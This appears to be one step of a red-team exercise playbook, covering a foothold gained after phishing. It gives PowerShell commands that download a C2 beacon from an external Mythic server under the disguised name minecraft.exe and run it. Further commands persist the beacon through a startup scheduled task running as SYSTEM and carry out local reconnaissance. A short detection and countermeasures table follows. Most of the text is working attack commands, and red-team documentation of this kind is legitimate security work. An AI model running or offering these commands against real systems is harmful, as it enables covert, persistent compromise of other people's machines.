# Step 2: Establish Foothold

**Objective**: Upload and persist a C2 implant on a user workstation after phishing execution, enabling long-term access through scheduled task persistence.

---

## Context

- Initial access was gained via malicious .docm payload from Step 0
- Target system: A user in the user-workstation subnet
- Persistence achieved using a scheduled task that runs a C2 beacon

---

## Execution

### 1. Upload & Run C2 Beacon
- The beacon establishes connection with the external C2 server
- From the initial compromised user workstation:

```
Invoke-WebRequest -Uri <link to mythic server and minecraft.exe> -OutFile "C:\Users\Public\minecraft.exe"
Start-Process "C:\Users\Public\minecraft.exe"
```

### 2. Create a Scheduled Task for Persistence

```
$Action = New-ScheduledTaskAction -Execute "C:\Users\Public\minecraft.exe"
$Trigger = New-ScheduledTaskTrigger -AtStartup
Register-ScheduledTask -TaskName "MinecraftBaby" -Action $Action -Trigger $Trigger -User "SYSTEM" -RunLevel Highest
```
- The task will trigger on every system boot (automatically re-runs the malaware)

### 3. Conduct Host Reconnaissance

```
whoami
net localgroup administrators
query user
Get-WmiObject win32_computersystem
```
- Identify local users on subnet, privilege levels, and host metadata
- Enumerate environment to prepare for lateral movement



---

## Result

- Red Team has persistent access to the user workstation
- Scheduled task ensures beacon works and we can control malware
- We can also see other active users (may need to avoid)


---

## Detection Opportunities

| Vector | Description |
|--------|-------------|
| minecraft.exe gets found| Malware could land in unintended file location|
| netstat displays outbound beacon | SOC/users see unusal traffic|
| Network/Powershell logging| Log files shows minecraft.exe being downloaded and running|


---

## Defensive Countermeasures

- isolate beacon host from network (assuming there is only one, TBD as of 07/16)
- reverse beacon analysis (wireshark, ghidra, etc)
- they could update endpoint detection response (crowdstrike, microsoft defender, etc)